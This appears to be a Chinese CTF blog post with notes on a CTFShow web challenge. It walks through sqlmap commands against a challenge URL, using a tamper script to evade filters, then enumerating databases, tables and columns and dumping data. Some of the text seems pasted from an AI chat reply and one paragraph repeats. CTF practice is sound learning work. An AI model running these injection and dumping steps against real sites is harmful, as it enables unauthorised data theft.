---
title:  CTFShow Web
tags: [CTF,WebSec]
categories: [WebSec,CTF]
---


没事打打CTF 也是一种乐趣，这里记录一下一些Web方向的题目，以及解题思路。
## SQLMap
在上述命令中，--batch 选项用于自动执行操作而无需手动干预，--level=4 选项增加了测试强度，--tamper=space2comment 选项用于规避防护机制。

命令的基本格式和说明如下：
`python .\sqlmap.py -u <目标URL> --batch --level=4 --tamper=space2comment`
对于你的具体需求，命令如下：

`python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment`

该命令会尝试对 https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 进行 SQL 注入测试，并自动处理测试过程中的问题。


执行这条命令可能会涉及以下几步：

识别注入点：确定 URL 参数中是否存在 SQL 注入漏洞。
数据库枚举：如果存在漏洞，尝试枚举数据库中的表和列。
数据提取：从数据库中提取数据。


要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：

  
要使用 SQLMap 查找数据库，你可以使用以下命令来执行数据库枚举操作。假设你已经确认目标存在 SQL 注入漏洞，并且你希望列出数据库、表和列。以下是逐步的 SQLMap 命令和说明：

1. **列出所有数据库**：
    
    `python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment --dbs`
    
    这个命令会列出目标数据库服务器上所有可用的数据库。
    
2. **列出某个数据库中的所有表**：
    
    假设你从上一步中获取到了数据库的名字，接下来你可以列出该数据库中的所有表。使用以下命令（将 `<database_name>` 替换为实际的数据库名称）：
    
    `python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> --tables`
    
3. **列出某个表中的所有列**：
    
    假设你从上一步中获取到了表的名字，接下来你可以列出该表中的所有列。使用以下命令（将 `<table_name>` 替换为实际的表名称）：
    
    `python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> -T <table_name> --columns`
    
4. **提取某个表中的数据**：
    
    如果你需要从表中提取数据，可以使用以下命令（将 `<column_name>` 替换为实际的列名）：
    
    
    `python .\sqlmap.py -u https://a2020962-4979-41f6-8eb4-cf91bf04c2f8.challenge.ctf.show/index.php?id=2 --batch --level=4 --tamper=space2comment -D <database_name> -T <table_name> -C <column_name> --dump`
    
    这个命令会从指定的表和列中提取数据。